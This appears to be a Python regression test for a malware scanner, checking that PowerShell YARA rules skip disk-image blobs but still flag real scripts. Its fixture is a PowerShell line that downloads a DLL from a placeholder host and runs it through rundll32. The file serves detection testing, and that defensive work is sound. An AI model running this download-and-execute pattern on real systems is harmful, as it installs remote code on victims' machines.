"""False-positive regressions: Windows-script YARA rules must not fire on disk-image / Mach-O blobs,
but still fire on real scripts."""
import os
import tempfile
import unittest

from cerber.engines.yara_engine import SCRIPT_RULE_TAGS, _is_fs_image
from cerber.pipeline import Pipeline

PS = (b"$p = $Env:temp + '\\\\a.dll'\n(New-Object Net.WebClient).downloadfile('http://x.test/a.dll', $p)\n"
      b"rundll32.exe $p,Start\n")


def _names(path):
    obj = Pipeline(options={"deep": True, "macos": False}).scan_file(path)
    return {d.name for d in obj.detections}


class GatingTest(unittest.TestCase):
    def test_fs_image_detection(self):
        blob = bytearray(4096)
        blob[1024:1026] = b"H+"
        self.assertTrue(_is_fs_image(bytes(blob)))
        self.assertFalse(_is_fs_image(PS))

    def test_tags_present(self):
        self.assertIn("POWERSHELL", SCRIPT_RULE_TAGS)

    def test_script_rule_skipped_on_fs_blob_but_not_on_script(self):
        with tempfile.TemporaryDirectory() as d:
            blob = bytearray(2048)
            blob[1024:1026] = b"H+"
            img = os.path.join(d, "img.bin")
            with open(img, "wb") as fh:
                fh.write(bytes(blob) + b"\0" * 500000 + PS)
            ps1 = os.path.join(d, "x.ps1")
            with open(ps1, "wb") as fh:
                fh.write(PS)
            self.assertFalse([n for n in _names(img) if "SECUINFRA_SUSP_Powershell" in n])
            self.assertTrue([n for n in _names(ps1) if "Powershell" in n or "PS1" in n])


if __name__ == "__main__":
    unittest.main()
